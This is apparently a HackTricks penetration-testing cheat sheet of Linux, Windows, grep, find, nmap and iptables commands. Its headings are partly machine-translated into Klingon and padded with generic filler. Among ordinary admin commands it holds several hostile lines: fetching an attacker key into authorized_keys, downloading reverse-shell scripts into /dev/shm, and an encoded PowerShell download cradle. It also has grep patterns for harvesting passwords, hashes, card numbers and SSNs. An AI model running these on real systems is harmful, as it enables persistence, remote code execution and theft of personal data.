# qo' vItlhutlh

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vItlhutlh **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Common Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vIleghlaHchugh **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash for Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

### grep

The `grep` command is used to search for specific patterns within files. It can be used with regular expressions to perform complex searches. Here are some examples:

```bash
# Search for the word "password" in the file /etc/passwd
grep "password" /etc/passwd

# Search for the word "password" in all files within the current directory
grep "password" *

# Search for the word "password" in all files within the current directory and its subdirectories
grep -r "password" .

# Search for the word "password" in all files within the current directory, ignoring case
grep -i "password" *

# Search for the word "password" in all files within the current directory, displaying line numbers
grep -n "password" *
```

### egrep

The `egrep` command is similar to `grep`, but it supports extended regular expressions. This means that you can use more advanced patterns in your searches. Here are some examples:

```bash
# Search for either the word "password" or "passphrase" in the file /etc/passwd
egrep "password|passphrase" /etc/passwd

# Search for any word that starts with "pass" in all files within the current directory
egrep "pass\w+" *

# Search for any word that starts with "pass" or "key" in all files within the current directory, ignoring case
egrep -i "pass\w+|key\w+" *
```

### fgrep

The `fgrep` command is used to search for fixed strings, rather than patterns. This means that it will treat the search term as a literal string, rather than a regular expression. Here are some examples:

```bash
# Search for the exact string "password" in the file /etc/passwd
fgrep "password" /etc/passwd

# Search for the exact string "password" in all files within the current directory
fgrep "password" *

# Search for the exact string "password" in all files within the current directory and its subdirectories
fgrep -r "password" .

# Search for the exact string "password" in all files within the current directory, ignoring case
fgrep -i "password" *
```

### zgrep

The `zgrep` command is used to search for patterns within compressed files. It works in a similar way to `grep`, but it can handle files that have been compressed using gzip. Here are some examples:

```bash
# Search for the word "password" in the compressed file /var/log/syslog.gz
zgrep "password" /var/log/syslog.gz

# Search for the word "password" in all compressed files within the current directory
zgrep "password" *.gz

# Search for the word "password" in all compressed files within the current directory and its subdirectories
zgrep -r "password" .

# Search for the word "password" in all compressed files within the current directory, ignoring case
zgrep -i "password" *.gz
```

### Conclusion

The `grep` family of commands is a powerful tool for searching for specific patterns within files. Whether you need to search for a simple string or a complex regular expression, there is a command that can help you find what you're looking for.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Qap

### Find Files

#### Find Files by Name

To find files by name, you can use the `find` command with the `-name` option. For example, to find all files with the name `password.txt` in the current directory and its subdirectories, you can run:

```
find / -name password.txt
```

#### Find Files by Type

To find files by type, you can use the `find` command with the `-type` option. For example, to find all directories in the current directory and its subdirectories, you can run:

```
find / -type d
```

To find all regular files (excluding directories and other special file types), you can run:

```
find / -type f
```

#### Find Files by Size

To find files by size, you can use the `find` command with the `-size` option. For example, to find all files larger than 1MB in the current directory and its subdirectories, you can run:

```
find / -size +1M
```

To find all files smaller than 1KB, you can run:

```
find / -size -1K
```

### Find Processes

To find processes running on your system, you can use the `ps` command. For example, to list all running processes, you can run:

```
ps aux
```

To filter the output and find a specific process, you can use the `grep` command. For example, to find all processes with the name `apache`, you can run:

```
ps aux | grep apache
```

### Find Network Connections

To find network connections on your system, you can use the `netstat` command. For example, to list all active network connections, you can run:

```
netstat -tuln
```

To filter the output and find a specific connection, you can use the `grep` command. For example, to find all connections on port `80`, you can run:

```
netstat -tuln | grep :80
```

### Find Users

To find users on your system, you can use the `cat` command to read the `/etc/passwd` file. For example, to list all users, you can run:

```
cat /etc/passwd
```

To filter the output and find a specific user, you can use the `grep` command. For example, to find all users with the username `admin`, you can run:

```
cat /etc/passwd | grep admin
```

### Find Installed Packages

To find installed packages on your system, you can use the package manager specific to your Linux distribution. Here are some examples:

- **Debian/Ubuntu**: `dpkg -l`
- **Red Hat/CentOS**: `rpm -qa`
- **Arch Linux**: `pacman -Q`

For example, to list all installed packages on a Debian/Ubuntu system, you can run:

```
dpkg -l
```

To filter the output and find a specific package, you can use the `grep` command. For example, to find the package `openssh-server`, you can run:

```
dpkg -l | grep openssh-server
```
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap qaw'wI' jatlh

Nmap is a powerful network scanning tool used by hackers and security professionals to discover open ports, services, and vulnerabilities on a target system. It provides a wide range of options and features to customize the scanning process.

Here are some useful Nmap commands and options to help you in your network scanning endeavors:

### Basic Scanning Techniques

- **TCP SYN Scan**: `nmap -sS <target>` - This scan sends TCP SYN packets to the target ports and analyzes the response to determine if the port is open, closed, or filtered.

- **TCP Connect Scan**: `nmap -sT <target>` - This scan establishes a full TCP connection with the target ports to determine if they are open or closed.

- **UDP Scan**: `nmap -sU <target>` - This scan sends UDP packets to the target ports and analyzes the response to determine if the port is open or closed.

### Advanced Scanning Techniques

- **OS Detection**: `nmap -O <target>` - This scan attempts to determine the operating system running on the target system by analyzing various network characteristics.

- **Service Version Detection**: `nmap -sV <target>` - This scan attempts to determine the version of services running on the target system by analyzing their responses.

- **Script Scanning**: `nmap -sC <target>` - This scan runs a set of predefined scripts to gather additional information about the target system.

### Output and Reporting

- **Output to File**: `nmap -oN <output_file> <target>` - This command saves the scan results to a specified file.

- **Output in XML Format**: `nmap -oX <output_file> <target>` - This command saves the scan results in XML format for further analysis.

- **Output in grepable Format**: `nmap -oG <output_file> <target>` - This command saves the scan results in a grepable format for easy parsing.

These are just a few examples of the many options and techniques available in Nmap. Experiment with different commands and explore the Nmap documentation to discover more ways to utilize this powerful tool in your network scanning activities.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

### Introduction

Bash is a popular command-line shell and scripting language used in Linux and Unix systems. It provides a powerful and flexible environment for executing commands, automating tasks, and writing scripts. This section covers some useful Bash commands that can be helpful for various purposes.

### Basic Commands

- `ls`: List files and directories in the current directory.
- `cd`: Change directory.
- `pwd`: Print the current working directory.
- `mkdir`: Create a new directory.
- `rm`: Remove files and directories.
- `cp`: Copy files and directories.
- `mv`: Move or rename files and directories.
- `cat`: Concatenate and display file contents.
- `less`: View file contents one page at a time.
- `head`: Display the first few lines of a file.
- `tail`: Display the last few lines of a file.
- `grep`: Search for a pattern in files.
- `find`: Search for files and directories.
- `chmod`: Change file permissions.
- `chown`: Change file ownership.
- `chgrp`: Change group ownership.

### File Operations

- `touch`: Create an empty file or update the timestamp of an existing file.
- `file`: Determine the file type.
- `stat`: Display file or file system status.
- `du`: Estimate file and directory space usage.
- `df`: Report file system disk space usage.
- `ln`: Create links between files.
- `tar`: Archive files and directories.
- `gzip`: Compress files.
- `gunzip`: Decompress files.
- `zip`: Create ZIP archives.
- `unzip`: Extract files from ZIP archives.

### Process Management

- `ps`: Display information about running processes.
- `top`: Monitor system processes in real-time.
- `kill`: Terminate processes.
- `bg`: Run a process in the background.
- `fg`: Bring a background process to the foreground.
- `nohup`: Run a command immune to hangups.
- `jobs`: List active jobs.

### System Information

- `uname`: Print system information.
- `hostname`: Print or set the system's hostname.
- `whoami`: Print the current user name.
- `id`: Print user and group information.
- `uptime`: Display system uptime.
- `free`: Display memory usage.
- `df`: Report file system disk space usage.
- `ifconfig`: Configure network interfaces.
- `ping`: Send ICMP echo requests to a network host.
- `netstat`: Print network connections, routing tables, and interface statistics.

### Text Processing

- `echo`: Print arguments to the standard output.
- `printf`: Format and print data.
- `cut`: Remove sections from lines of files.
- `sort`: Sort lines of text files.
- `uniq`: Report or omit repeated lines.
- `wc`: Print newline, word, and byte counts.
- `sed`: Stream editor for filtering and transforming text.
- `awk`: Pattern scanning and processing language.
- `diff`: Compare files line by line.
- `patch`: Apply a diff file to an original.

### Networking

- `ssh`: Secure shell remote login.
- `scp`: Securely copy files between hosts.
- `rsync`: Remote file and directory synchronization.
- `wget`: Retrieve files from the web.
- `curl`: Transfer data from or to a server.
- `nc`: Netcat - networking utility for reading from and writing to network connections.
- `telnet`: User interface to the TELNET protocol.
- `ftp`: File Transfer Protocol client.

### System Administration

- `sudo`: Execute a command as another user.
- `su`: Substitute user identity.
- `passwd`: Change user password.
- `useradd`: Create a new user account.
- `userdel`: Delete a user account.
- `groupadd`: Create a new group.
- `groupdel`: Delete a group.
- `visudo`: Edit the sudoers file.
- `crontab`: Schedule commands to run at specific times.
- `service`: Control system services.
- `systemctl`: Control the systemd system and service manager.

### Conclusion

These are just a few examples of the many useful Bash commands available in Linux. By mastering these commands, you can become more efficient and productive in your Linux system administration tasks.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

### Description

Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network filtering rules to control incoming and outgoing network traffic.

### Basic Usage

To view the current iptables rules, use the following command:

```bash
iptables -L
```

To add a new rule to iptables, use the following command:

```bash
iptables -A <chain> <rule>
```

To delete a rule from iptables, use the following command:

```bash
iptables -D <chain> <rule>
```

### Chains

Iptables uses different chains to organize and process network traffic. The most commonly used chains are:

- **INPUT**: Controls incoming traffic to the system.
- **OUTPUT**: Controls outgoing traffic from the system.
- **FORWARD**: Controls traffic that is being routed through the system.

### Rules

Iptables rules define the criteria for matching network packets and the actions to be taken on those packets. Each rule consists of a set of conditions and an associated action.

Some commonly used rule options include:

- **-p**: Specifies the protocol (e.g., tcp, udp).
- **-s**: Specifies the source IP address or network.
- **-d**: Specifies the destination IP address or network.
- **-j**: Specifies the action to be taken (e.g., ACCEPT, DROP).

### Example

Here is an example of how to add a rule to iptables to allow incoming SSH connections from a specific IP address:

```bash
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT
```

This rule allows incoming TCP traffic on port 22 (SSH) from the IP address 192.168.1.100.

### Conclusion

Iptables is a versatile tool for managing network traffic on Linux systems. By understanding its basic usage and rules, you can effectively control and secure your network connections.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
